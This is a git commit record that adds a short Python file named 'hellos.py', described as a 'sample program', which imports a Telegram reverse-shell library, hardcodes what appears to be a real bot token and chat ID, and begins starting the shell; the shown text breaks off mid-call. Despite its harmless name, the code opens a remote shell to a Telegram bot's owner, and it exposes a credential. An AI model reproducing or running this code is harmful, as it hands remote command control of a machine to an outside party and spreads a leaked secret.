8dddfb6ee714d009f9eceed15f654d3a889c23ed
66644e <methosmusic47@gmail.com>
2026-03-26 22:32:09 -0400

    Create hellos.py

---
+++ hellos.py
@@ -0,0 +1,12 @@
+# sample program
+from py_tel_reverse_shell import tel_shell
+
+
+
+## get token from @BotFather in telegram
+my_token = "8415263633:AAHaWm_SisbUozH9jLlYydGJSsgr8iGeTMg"
+## get your number id from @userinfobot in telegram
+my_chat_id = "6503279292"
+
+
+tel_shell.start_shell(bot_token=my_to
